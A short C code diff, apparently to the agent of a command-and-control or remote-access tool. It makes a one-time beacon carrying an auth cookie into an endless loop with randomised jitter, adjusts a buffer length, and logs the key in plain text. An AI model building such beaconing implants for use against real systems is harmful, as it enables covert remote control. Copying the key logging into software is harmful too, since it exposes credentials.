@@ -210,7 +210,7 @@ void agent_beacon() {
     CHAR* data_pointer = malloc(pointer_length);
     sprintf_s(data_pointer, pointer_length, data.format, auth.cookie);
 
-    DWORD data_length = pointer_length - strlen(data.format) - 2;
+    DWORD data_length = pointer_length - strlen(data.format);
     CHAR* buffer = encode(data_pointer, data_length);
     package(buffer);
 
@@ -392,6 +392,10 @@ int main(int argc, char* argv[]) {
 
     register_device();
     Sleep(calculate_jitter(3, 30));
-    agent_beacon();
-    Sleep(calculate_jitter(3, 30));
+
+    while (true) {
+        log_info("Using key: %s", auth.cookie);
+        agent_beacon();
+        Sleep(calculate_jitter(3, 30));
+    }
 }
